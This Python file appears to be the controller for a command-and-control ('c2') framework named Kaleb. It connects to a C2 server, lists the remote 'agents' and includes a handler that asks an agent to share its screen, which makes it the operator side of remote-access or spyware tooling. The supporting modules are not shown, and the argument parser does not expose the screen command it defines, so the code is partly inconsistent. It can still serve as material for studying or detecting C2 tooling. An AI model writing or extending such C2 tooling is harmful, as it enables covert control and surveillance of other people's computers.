import sys

import client
import message

import argparse


class Controller(client.Client):
    def __init__(self):
        super().__init__("controller")

    def do(self, cmd):
        match cmd:
            case "get-agents":
                self.do_get_agents()
            case "get-screen":
                self.do_get_screen()
            case _:
                print("error")

    def do_get_screen(self):
        msg = message.Share(sys.argv[2])
        self.my_socket.sendall((msg.pack()))

    def do_get_agents(self):
        self.send(message.GetAgents())
        response = message.recv(self.my_socket)
        print(response.agents)


def main():

    parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')
    parser.add_argument('--server', required=True,
                        help='Kaleb c2 server address')
    parser.add_argument('--port', type=int, default="8585",
                        help='Kaleb c2 server port')
    parser.add_argument('command', choices=['get-agents'],
                        help='command to perform')
    args = parser.parse_args()

    c = Controller()
    c.connect(args.server, args.port)

    c.do(args.command)


if __name__ == '__main__':
    main()
